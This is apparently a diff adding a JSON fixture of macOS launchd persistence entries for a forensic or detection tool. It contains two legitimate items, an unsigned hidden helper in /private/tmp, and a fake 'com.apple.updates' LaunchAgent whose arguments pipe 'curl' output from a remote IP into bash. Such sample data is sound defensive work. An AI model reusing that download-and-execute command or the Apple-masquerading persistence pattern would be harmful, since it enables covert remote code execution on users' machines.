@@ -1,0 +1,69 @@
+[
+  {
+    "Path": "/Library/LaunchDaemons/com.apple.softwareupdated.plist",
+    "Label": "com.apple.softwareupdated",
+    "Program": "/System/Library/PrivateFrameworks/SoftwareUpdate.framework/Resources/softwareupdated",
+    "ProgramArguments": null,
+    "RunAtLoad": true,
+    "KeepAlive": true,
+    "Mtime": "2024-11-02T08:14:53Z",
+    "OSPath": "/Library/LaunchDaemons/com.apple.softwareupdated.plist",
+    "CodeSignature": {
+      "Exists": true,
+      "Trusted": true,
+      "SubjectName": "Software Signing",
+      "TeamIdentifier": "apple"
+    }
+  },
+  {
+    "Path": "/Library/LaunchAgents/com.google.keystone.agent.plist",
+    "Label": "com.google.keystone.agent",
+    "Program": null,
+    "ProgramArguments": [
+      "/Users/analyst/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/Helpers/GoogleSoftwareUpdateAgent.app/Contents/MacOS/GoogleSoftwareUpdateAgent",
+      "-runMode",
+      "ifneeded"
+    ],
+    "RunAtLoad": true,
+    "KeepAlive": false,
+    "Mtime": "2025-03-18T21:07:11Z",
+    "OSPath": "/Library/LaunchAgents/com.google.keystone.agent.plist",
+    "CodeSignature": {
+      "Exists": true,
+      "Trusted": true,
+      "SubjectName": "Developer ID Application: Google LLC (EQHXZ8M8AV)",
+      "TeamIdentifier": "EQHXZ8M8AV"
+    }
+  },
+  {
+    "Path": "/Users/analyst/Library/LaunchAgents/com.apple.updates.plist",
+    "Label": "com.apple.updates",
+    "Program": null,
+    "ProgramArguments": [
+      "/bin/bash",
+      "-c",
+      "curl -fsSL http://185.220.101.4/x | bash"
+    ],
+    "RunAtLoad": true,
+    "KeepAlive": false,
+    "Mtime": "2026-06-30T02:41:09Z",
+    "OSPath": "/Users/analyst/Library/LaunchAgents/com.apple.updates.plist",
+    "CodeSignature": null
+  },
+  {
+    "Path": "/Users/Shared/.cache/com.system.helper.plist",
+    "Label": "com.system.helper",
+    "Program": "/private/tmp/.helper/run",
+    "ProgramArguments": null,
+    "RunAtLoad": true,
+    "KeepAlive": true,
+    "Mtime": "2026-07-01T13:22:47Z",
+    "OSPath": "/Users/Shared/.cache/com.system.helper.plist",
+    "CodeSignature": {
+      "Exists": false,
+      "Trusted": false,
+      "SubjectName": null,
+      "TeamIdentifier": null
+    }
+  }
+]
